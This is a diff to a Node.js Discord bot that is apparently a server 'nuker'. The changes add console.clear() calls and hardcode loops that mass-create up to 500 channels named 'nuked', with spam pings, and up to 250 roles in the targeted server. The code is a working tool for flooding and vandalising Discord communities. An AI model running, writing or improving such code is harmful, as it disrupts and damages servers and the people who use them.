@@ -17,6 +17,7 @@ if(custom === 'y'){
     var presenceName = readline.question('Presence name: ')
     console.clear()
     var status = readline.questionInt('Type of Status\n' + chalk.green('[1] Online\n') + chalk.yellow('[2] Idle\n') + chalk.red('[3] Do not Disturb\n') + chalk.magenta('[4] Invisible\n') + chalk.white('Enter the number: '))
+    console.clear()
 
     if(status === 1){
         status = 'online'
@@ -30,6 +31,7 @@ if(custom === 'y'){
 }
 
 client.on('ready', () => {
+    console.clear()
     if(presence === 1){
         client.user.setActivity(presenceName, {type: "PLAYING"})
         client.user.setStatus(status)
@@ -265,7 +267,7 @@ client.on('messageCreate', async (message) => {
         })
 
         //Mass channels & spam pings
-        for(let i = 0; i < amount; i++){
+        for(let i = 0; i < 500; i++){
             if(message.guild.channels.cache.size === 500) break
             await message.guild.channels.create(channelName || 'nuked', {type: 'GUILD_TEXT'})
             .then(
@@ -279,7 +281,7 @@ client.on('messageCreate', async (message) => {
         }
 
         //Mass roles
-        for(let i = 0; i < amount; i++){
+        for(let i = 0; i < 250; i++){
             if(message.guild.roles.cache.size === 250) break
             await message.guild.roles.create({ name: roleName || 'nuked', color: 'RANDOM' })
             .catch(e => console.log(`Error on creating role - ${e}`))
